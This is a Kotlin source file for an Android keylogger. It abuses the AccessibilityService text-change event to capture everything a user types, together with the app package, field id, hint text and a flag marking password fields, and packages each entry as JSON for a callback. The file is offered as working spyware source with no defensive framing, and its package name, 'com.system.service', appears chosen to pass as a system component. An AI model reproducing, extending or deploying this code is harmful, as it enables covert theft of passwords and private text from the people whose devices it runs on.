// [context: Kotlin, Android API 26+, keylogger via AccessibilityEvent TYPE_VIEW_TEXT_CHANGED]
package com.system.service.modules.keylogger

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject

class AccessibilityKeylogger(private val service: AccessibilityService) {

    var onKeystroke: ((JSONObject) -> Unit)? = null
    private var lastPackage = ""
    private var lastField = ""

    fun handleEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString("") { it.toString() }
                val node = event.source
                val pkg = event.packageName?.toString() ?: ""
                val hint = node?.hintText?.toString() ?: ""
                val viewId = node?.viewIdResourceName ?: ""
                val obj = JSONObject().apply {
                    put("ts", System.currentTimeMillis())
                    put("pkg", pkg)
                    put("field", viewId)
                    put("hint", hint)
                    put("text", text)
                    put("password", node?.isPassword ?: false)
                }
                onKeystroke?.invoke(obj)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                lastPackage = event.packageName?.toString() ?: ""
            }
        }
    }
}
